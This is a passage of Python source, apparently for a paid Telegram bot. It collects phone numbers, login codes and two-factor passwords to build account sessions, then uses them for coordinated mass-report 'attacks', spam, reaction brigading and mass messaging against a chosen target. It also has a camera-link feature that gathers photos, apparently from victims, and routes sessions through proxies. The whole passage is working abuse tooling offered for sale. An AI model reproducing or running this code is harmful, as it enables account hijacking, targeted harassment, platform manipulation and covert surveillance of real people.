    sub = get_user_sub(user_id)
    if not sub: await bot.send_message(chat_id,f"No subscription!\nUse /subscribe\nContact: {ADMIN_CONTACT}"); return
    current = len(get_sessions())
    if not sub.get('pending') and current>=sub['sessions']: await bot.send_message(chat_id,f"Limit reached! {current}/{sub['sessions']}\nContact: {ADMIN_CONTACT}"); return
    async with bot.conversation(chat_id,timeout=300) as conv:
        await conv.send_message("Send phone number:\nExample: +989123456789")
        resp = await conv.get_response(); phone = resp.text.strip()
        if not phone.startswith('+'): phone = '+'+phone
        try:
            session_name = phone.replace('+',''); session_path = f"{SESSION_DIR}/{session_name}"
            client = TelegramClient(session_path,API_ID,API_HASH); await client.connect()
            await client.send_code_request(phone)
            await conv.send_message(f"Code sent to {phone}\n\nEnter the 5-digit code:")
            resp = await conv.get_response(); code = resp.text.strip()
            try: await client.sign_in(phone,code)
            except Exception as e:
                if "password" in str(e).lower():
                    await conv.send_message("2FA Enabled! Enter password:")
                    resp = await conv.get_response(); password = resp.text.strip()
                    await client.sign_in(password=password)
                else: raise e
            me = await client.get_me(); await client.disconnect()
            new_count = len(get_sessions()); limit = sub['sessions']
            msg = f"Account Added!\n\n{me.first_name}\n{phone}\n{session_name}.session\n{new_count}/{limit}"
            if sub.get('pending') and new_count>=limit:
                add_subscription(user_id,"free")
                msg += "\n\nSubscription Activated!\nYour free 7-day subscription is now active!"
            await conv.send_message(msg)
        except Exception as e:
            await conv.send_message(f"Error: {str(e)[:100]}")
            try:
                if os.path.exists(session_path+".session"): os.remove(session_path+".session")
            except: pass
            try: await client.disconnect()
            except: pass

async def check_expired(bot):
    while True:
        try:
            expired = []
            for uid,sub in list(subscribers.items()):
                if not sub.get('pending'):
                    if datetime.now()>datetime.fromisoformat(sub['expiry']): expired.append(uid)
            for uid in expired: del subscribers[uid]
            if expired: save_subscribers(subscribers)
        except: pass
        await asyncio.sleep(3600)

async def main():
    global TARGET,TARGET_ACCOUNT,is_attacking,is_clock_active,ADMINS,clock_task
    global is_auto_spam_active,auto_spam_task,camera_link,last_camera_photo

    unlock_all()
    bot = TelegramClient('bot_main',API_ID,API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    print(f"[+] SIGMATOR AI BOT STARTED")
    print(f"[+] Emails: {len(load_emails())}")
    print(f"[+] Sessions: {len(get_sessions())}")
    print(f"[+] Gemini AI: Connected")
    print(f"[+] Daily limit: {DAILY_REPORT_LIMIT}")
    print(f"[+] Master ID: {MASTER_ID}")

    asyncio.create_task(check_expired(bot))

    @bot.on(events.NewMessage(pattern='/start'))
    async def start_cmd(e):
        txt,btns = await get_menu(e.sender_id)
        await e.respond(txt,buttons=btns)

    @bot.on(events.NewMessage(pattern='/lock'))
    async def lock_cmd(e):
        if e.sender_id!=MASTER_ID: return
        await e.respond("Locking all files..."); lock_all()
        await e.respond("All files encrypted! Bot will exit.")
        await asyncio.sleep(1); sys.exit(0)

    @bot.on(events.NewMessage(pattern='/subscribe'))
    async def sub_cmd(e): await subscription_menu(bot,e.chat_id,e.sender_id)

    @bot.on(events.NewMessage(pattern='/add'))
    async def add_cmd(e): await session_builder(bot,e.chat_id,e.sender_id)

    @bot.on(events.NewMessage(pattern='/status'))
    async def status_cmd(e):
        sub = get_user_sub(e.sender_id)
        if sub:
            if sub.get('pending'): await e.respond(f"Pending: {len(get_sessions())}/{sub['sessions']} accounts")
            else:
                expiry = datetime.fromisoformat(sub['expiry']); days = (expiry-datetime.now()).days
                await e.respond(f"{SUB_PLANS[sub['plan']]['name']}\n{len(get_sessions())}/{sub['sessions']}\n{days} days left")
        else: await e.respond("No active subscription!\nUse /subscribe")

    @bot.on(events.CallbackQuery)
    async def callback(e):
        global TARGET,TARGET_ACCOUNT,is_attacking,is_clock_active,ADMINS,clock_task
        global is_auto_spam_active,auto_spam_task,camera_link,last_camera_photo

        is_admin_user = e.sender_id in ADMINS
        sub = get_user_sub(e.sender_id) if not is_admin_user else None
        has_sub = sub is not None and not sub.get('pending',False)
        
        if not is_admin_user and not has_sub:
            allowed = ["sub_free","sub_buy","sub_status"]
            if e.data.decode() not in allowed: await e.answer("Subscribe to access!",alert=True); return
        
        await e.answer()
        data = e.data.decode()

        if data.startswith("a_"):
            if TARGET=='target': await e.respond("Set target first!"); return
            cr,ce,_,_ = check_daily_limit()
            if not cr and not ce: await e.respond(f"DAILY LIMIT REACHED!\n\n{DAILY_REPORT_LIMIT}/{DAILY_REPORT_LIMIT} used\nResets tomorrow.\n\nContact: {ADMIN_CONTACT}"); return
            mode = data.split('_')[1]
            msg = await e.respond(f"Starting {mode.upper()} attack...\nAI analyzing...")
            is_attacking = True; asyncio.create_task(smart_attack(bot,e.chat_id,msg.id,mode))

        elif data == "fast_pyrogram":
            if TARGET=='target': await e.respond("Set target first!"); return
            msg = await e.respond("Starting FAST PYROGRAM..."); asyncio.create_task(run_fast_pyrogram(bot,e.chat_id,msg.id))

        elif data == "join_group":
            if TARGET=='target': await e.respond("Set target first!"); return
            msg = await e.respond("ch/gp join starting..."); asyncio.create_task(run_join_group(bot,e.chat_id,msg.id))

        elif data == "group_report_menu":
            if TARGET=='target': await e.respond("Set target first!"); return
            btns = []
            for i,(reason,msg) in enumerate(ALL_REPORT_REASONS): btns.append([Button.inline(msg[:40],f"select_reason_{i}")])
            btns.append([Button.inline("ALL 9 REASONS",b"select_all_reasons")]); btns.append([Button.inline("Back",b"back")])
            await e.edit("SELECT REPORT REASONS:",buttons=btns)

        elif data.startswith("select_reason_"):
            idx = int(data.split("_")[2])
            reason,msg = ALL_REPORT_REASONS[idx]
            msg = await e.respond(f"Reporting with: {msg[:50]}..."); asyncio.create_task(run_group_report(bot,e.chat_id,msg.id,[(reason,msg)]))

        elif data == "select_all_reasons":
            msg = await e.respond("Reporting with ALL 9 reasons..."); asyncio.create_task(run_group_report(bot,e.chat_id,msg.id,ALL_REPORT_REASONS))

        elif data == "report_profile":
            if TARGET=='target': await e.respond("Set target first!"); return
            msg = await e.respond("Reporting profile..."); sessions = get_sessions(); ok,fail = 0,0
            for s in sessions:
                res = await report_worker(s,TARGET.replace('@','').strip(),types.InputReportReasonSpam(),"Fake account - impersonation")
                if res==1: ok+=1
                else: fail+=1
            await msg.edit(f"Profile Report Done!\nSuccess: {ok}\nFailed: {fail}")

        elif data == "set":
            async with bot.conversation(e.chat_id,timeout=60) as conv:
                await conv.send_message("Send target channel/username:"); TARGET = (await conv.get_response()).text.strip()
                await conv.send_message("Send associated account (or 'skip'):"); acc_resp = (await conv.get_response()).text.strip()
                TARGET_ACCOUNT = None if acc_resp.lower()=='skip' else acc_resp
                impersonated = ai_channel(TARGET)
                txt,btns = await get_menu(e.sender_id)
                await conv.send_message(f"Target Set!\n\nChannel: {TARGET}\nAccount: {TARGET_ACCOUNT or 'N/A'}\nAI Detected: {impersonated}",buttons=btns)

        elif data == "monit":
            sessions = get_sessions(); txt = f"Sessions ({len(sessions)}):\n\n"
            for s in sessions[:20]: txt += f"- {os.path.basename(s)}\n"
            await e.edit(txt,buttons=[[Button.inline("Back",b"back")]])

        elif data == "stop":
            is_attacking = False; is_auto_spam_active = False
            if auto_spam_task: auto_spam_task.cancel()
            if clock_task: clock_task.cancel()
            txt,btns = await get_menu(e.sender_id); await e.edit(txt,buttons=btns)

        elif data == "back":
            txt,btns = await get_menu(e.sender_id)
            try: await e.edit(txt,buttons=btns)
            except: pass

        elif data == "ping":
            start = time.time(); await bot.get_me()
            await e.edit(f"Ping: {int((time.time()-start)*1000)}ms")

        elif data == "leave_ch":
            if TARGET=='target': await e.respond("Set target first!"); return
            sessions = get_sessions(); ok,fail = 0,0
            for s in sessions:
                res = await leave_worker(s,TARGET)
                if res=="left": ok+=1
                else: fail+=1
            await e.respond(f"Left: {ok} | Failed: {fail}")

        elif data in ("react_pos","react_neg"):
            if TARGET=='target': await e.respond("Set target first!"); return
            emojies = ["👍","🔥","❤️","🥰"] if data=="react_pos" else ["👎","💩","🤮","🤡"]
            sessions = get_sessions(); ok,fail = 0,0
            for s in sessions:
                res = await reaction_worker(s,TARGET,emojies)
                if res=="success": ok+=1
                else: fail+=1
            await e.respond(f"Reactions: {ok} | Failed: {fail}")

        elif data == "clock_menu":
            if is_clock_active:
                is_clock_active = False
                if clock_task: clock_task.cancel()
                txt,btns = await get_menu(e.sender_id); await e.edit(txt,buttons=btns)
            else:
                sessions = get_sessions()
                if not sessions: await e.respond("No sessions!"); return
                btns = []
                for i,s in enumerate(sessions[:20]): btns.append([Button.inline(os.path.basename(s),f"clk_{i}")])
                btns.append([Button.inline("Back",b"back")]); await e.edit("Select session:",buttons=btns)

        elif data.startswith("clk_"):
            idx = int(data.split('_')[1]); sessions = get_sessions()
            if idx>=len(sessions): return
            if is_clock_active: is_clock_active = False
            if clock_task: clock_task.cancel()
            session_path = sessions[idx]; client = create_stable_client(session_path); await client.connect()
            if await client.is_user_authorized():
                is_clock_active = True; clock_task = asyncio.create_task(clock_task_func(client))
                await e.respond(f"Clock ON: {os.path.basename(session_path)}")
            else: await e.respond("Not authorized!")

        elif data == "msg_menu":
            async with bot.conversation(e.chat_id,timeout=60) as conv:
                await conv.send_message("Send recipient:"); target_user = (await conv.get_response()).text.strip()
                await conv.send_message("Send text:"); msg_text = (await conv.get_response()).text.strip()
                sessions = get_sessions(); ok,fail = 0,0
                for s in sessions:
                    res = await send_msg_worker(s,target_user,msg_text)
                    if res=="success": ok+=1
                    else: fail+=1
                await conv.send_message(f"Sent: {ok} | Failed: {fail}")

        elif data == "proxy_main":
            btns = [
                [Button.inline("View Proxies",b"view_proxies")],
                [Button.inline("Set Proxy",b"set_proxy")],
                [Button.inline("Remove Proxy",b"remove_proxy")],
                [Button.inline("Back",b"back")]
            ]; await e.edit("PROXY MANAGEMENT",buttons=btns)

        elif data == "view_proxies":
            proxies = load_proxies()
            if not proxies: await e.edit("No proxies!",buttons=[[Button.inline("Back",b"proxy_main")]]); return
            txt = "PROXY LIST\n\n"
            for sess,proxy in list(proxies.items())[:15]:
                if '@' in proxy: proxy = proxy.split('@')[0]+"***"
                txt += f"- {sess}: {proxy[:50]}...\n"
            await e.edit(txt,buttons=[[Button.inline("Back",b"proxy_main")]])

        elif data == "set_proxy":
            sessions = get_sessions()
            if not sessions: await e.respond("No sessions!"); return
            btns = []
            for i,s in enumerate(sessions[:20]): btns.append([Button.inline(os.path.basename(s),f"setproxy_{i}")])
            btns.append([Button.inline("Back",b"proxy_main")]); await e.edit("Select session:",buttons=btns)

        elif data.startswith("setproxy_"):
            idx = int(data.split('_')[1]); sessions = get_sessions()
            if idx>=len(sessions): return
            session_path = sessions[idx]; session_name = os.path.basename(session_path)
            async with bot.conversation(e.chat_id,timeout=60) as conv:
                await conv.send_message(f"Session: {session_name}\n\nSend proxy:"); proxy_input = (await conv.get_response()).text.strip()
                if proxy_input.lower()=='none':
                    proxies = load_proxies(); proxies.pop(session_name,None); save_proxies(proxies)
                    await conv.send_message("Proxy removed!")
                else:
                    proxies = load_proxies(); proxies[session_name]=proxy_input; save_proxies(proxies)
                    await conv.send_message("Proxy saved!")

        elif data == "remove_proxy":
            sessions = get_sessions()
            if not sessions: await e.respond("No sessions!"); return
            btns = []
            for i,s in enumerate(sessions[:20]): btns.append([Button.inline(os.path.basename(s),f"rmproxy_{i}")])
            btns.append([Button.inline("Back",b"proxy_main")]); await e.edit("Select session:",buttons=btns)

        elif data.startswith("rmproxy_"):
            idx = int(data.split('_')[1]); sessions = get_sessions()
            if idx>=len(sessions): return
            session_name = os.path.basename(sessions[idx]); proxies = load_proxies()
            if session_name in proxies: del proxies[session_name]; save_proxies(proxies); await e.respond(f"Removed: {session_name}")
            else: await e.respond("Not found!")

        elif data == "email_menu":
            emails = load_emails()
            btns = [
                [Button.inline(f"View Emails ({len(emails)})",b"view_emails")],
                [Button.inline("Add Email",b"add_email")],
                [Button.inline("Remove Email",b"remove_email")],
                [Button.inline("Back",b"back")]
            ]; await e.edit("EMAIL MANAGER",buttons=btns)

        elif data == "view_emails":
            emails = load_emails()
            if not emails: await e.edit("No emails!",buttons=[[Button.inline("Back",b"email_menu")]]); return
            txt = f"EMAILS ({len(emails)}):\n\n"
            for i,em in enumerate(emails,1): txt += f"{i}. {em['email']}\n"
            await e.edit(txt,buttons=[[Button.inline("Back",b"email_menu")]])

        elif data == "add_email":
            async with bot.conversation(e.chat_id,timeout=120) as conv:
                await conv.send_message("Send email:"); email_addr = (await conv.get_response()).text.strip()
                await conv.send_message("Send password:"); password = (await conv.get_response()).text.strip()
                emails = load_emails(); emails.append({"email":email_addr,"password":password})
                save_emails(emails); await conv.send_message(f"Saved! Total: {len(emails)}")

        elif data == "remove_email":
            emails = load_emails()
            if not emails: await e.edit("No emails!"); return
            btns = []
            for i,em in enumerate(emails): btns.append([Button.inline(f"Remove: {em['email'][:40]}",f"rememail_{i}")])
            btns.append([Button.inline("Back",b"email_menu")]); await e.edit("Select:",buttons=btns)

        elif data.startswith("rememail_"):
            idx = int(data.split('_')[1]); emails = load_emails()
            if idx<len(emails): removed = emails.pop(idx); save_emails(emails); await e.respond(f"Removed: {removed['email']}")

        elif data == "auto_spam_menu":
            if is_auto_spam_active:
                await e.edit("AUTO SPAM RUNNING",buttons=[[Button.inline("STOP SPAM",b"stop_auto_spam")],[Button.inline("Back",b"back")]])
            else:
                sessions = get_sessions()
                if not sessions: await e.respond("No sessions!"); return
                btns = []
                for i,s in enumerate(sessions[:20]): btns.append([Button.inline(os.path.basename(s),f"as_{i}")])
                btns.append([Button.inline("Back",b"back")]); await e.edit("Select session:",buttons=btns)

        elif data.startswith("as_"):
            idx = int(data.split('_')[1]); sessions = get_sessions()
            if idx>=len(sessions): return
            session_path = sessions[idx]
            async with bot.conversation(e.chat_id,timeout=120) as conv:
                await conv.send_message("Send group link:"); group = (await conv.get_response()).text.strip()
                await conv.send_message("Send message:"); message = (await conv.get_response()).text.strip()
                await conv.send_message("Interval (seconds):")
                try: interval = int((await conv.get_response()).text.strip())
                except: interval = 60
                patch_session_db(session_path); client = create_stable_client(session_path,use_proxy=True); await client.connect()
                if await client.is_user_authorized():
                    is_auto_spam_active = True; auto_spam_task = asyncio.create_task(auto_spam_worker(client,group,message,interval))
                    await conv.send_message(f"Started!\nInterval: {interval}s")
                else: await conv.send_message("Not authorized!")

        elif data == "stop_auto_spam":
            is_auto_spam_active = False
            if auto_spam_task: auto_spam_task.cancel()
            await e.respond("Stopped!"); txt,btns = await get_menu(e.sender_id); await e.edit(txt,buttons=btns)

        elif data == "camera_menu":
            if camera_link:
                btns = [[Button.inline("Get Link",b"cam_get_link")],[Button.inline("Check Photo",b"cam_check_photo")],[Button.inline("New Link",b"cam_new_link")],[Button.inline("Back",b"back")]]
                await e.edit("CAMERA MENU\nCamera is active!",buttons=btns)
            else:
                btns = [[Button.inline("Start Camera",b"cam_start")],[Button.inline("Back",b"back")]]
                await e.edit("CAMERA MENU\nCamera not started!",buttons=btns)

        elif data == "cam_start":
            await e.respond("Starting camera..."); link = await asyncio.get_event_loop().run_in_executor(None,start_camera)
            if link: await e.respond(f"Camera Ready!\n{link}")
            else: await e.respond("Failed!")

        elif data == "cam_new_link":
            camera_link = None; link = await asyncio.get_event_loop().run_in_executor(None,start_camera)
            if link: await e.respond(f"New Link!\n{link}")
            else: await e.respond("Failed!")

        elif data == "cam_get_link":
            await e.respond(f"Camera Link:\n{camera_link}" if camera_link else "No link!")

        elif data == "cam_check_photo":
            photos = glob.glob('./camera_*.jpg')
            if photos:
                latest = max(photos,key=os.path.getctime)
                await bot.send_file(e.chat_id,latest,caption="Latest photo")
            else: await e.respond("No photo yet!")

        elif data == "sub_menu":
            await subscription_menu(bot,e.chat_id,e.sender_id)

        elif data == "sub_free":
            user_id = str(e.sender_id)
            subscribers[user_id] = {'plan':'free','sessions':5,'expiry':'pending','added':datetime.now().isoformat(),'pending':True}
            save_subscribers(subscribers)
            await e.respond("Free Subscription Requested!\n\nTo activate your free 7-day subscription:\n- Add 5 accounts using /add command\n- Subscription activates automatically after 5 accounts\n\nProgress: 0/5 accounts\n\nUse /add to start adding accounts!")
            txt,btns = await get_menu(e.sender_id); await e.respond(txt,buttons=btns)

        elif data == "sub_buy":
            await e.respond(f"Premium Plans\n\n7 Days - 50k Toman\n1 Month - 100k Toman\n3 Months - 200k Toman\n1 Year - 500k Toman\n\nContact: {ADMIN_CONTACT}")

        elif data == "sub_status":
            sub = get_user_sub(e.sender_id)
            if sub:
                if sub.get('pending'): await e.respond(f"Pending: {len(get_sessions())}/{sub['sessions']} accounts")
                else:
                    expiry = datetime.fromisoformat(sub['expiry']); days = (expiry-datetime.now()).days
                    await e.respond(f"{SUB_PLANS[sub['plan']]['name']}\n{len(get_sessions())}/{sub['sessions']}\n{days} days left")
            else: await e.respond("No active subscription!")

        elif data == "admin_menu":
            admins = load_admins(); txt = f"ADMINS ({len(admins)}/{MAX_ADMINS})\n\n"
            for i,a in enumerate(admins,1): txt += f"{i}. {a}\n"
            btns = [[Button.inline("Add Admin",b"admin_add")],[Button.inline("Remove Admin",b"admin_remove")],[Button.inline("Back",b"back")]]
            await e.edit(txt,buttons=btns)

        elif data == "admin_add":
            async with bot.conversation(e.chat_id,timeout=60) as conv:
                await conv.send_message(f"Send user_id to add ({len(load_admins())}/{MAX_ADMINS}):"); resp = await conv.get_response()
                try:
                    new_id = int(resp.text.strip()); success,msg = add_admin(new_id)
                    if success: ADMINS.clear(); ADMINS.extend(load_admins())
                    await conv.send_message(msg)
                except: await conv.send_message("Invalid ID!")

        elif data == "admin_remove":
            async with bot.conversation(e.chat_id,timeout=60) as conv:
                await conv.send_message("Send user_id to remove:"); resp = await conv.get_response()
                try:
                    del_id = int(resp.text.strip()); success,msg = remove_admin(del_id)
                    if success: ADMINS.clear(); ADMINS.extend(load_admins())
                    await conv.send_message(msg)
                except: await conv.send_message("Invalid ID!")

        elif data == "limit_info":
            cr,ce,rr,re = check_daily_limit()
            await e.respond(f"DAILY LIMITS\n\nReports: {DAILY_REPORT_LIMIT-rr}/{DAILY_REPORT_LIMIT}\nEmails: {DAILY_REPORT_LIMIT-re}/{DAILY_REPORT_LIMIT}\n\nResets at midnight.\nContact: {ADMIN_CONTACT}")

    import atexit; atexit.register(lock_all)
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: lock_all(); print("\n[!] Locked & Stopped"); sys.exit(0)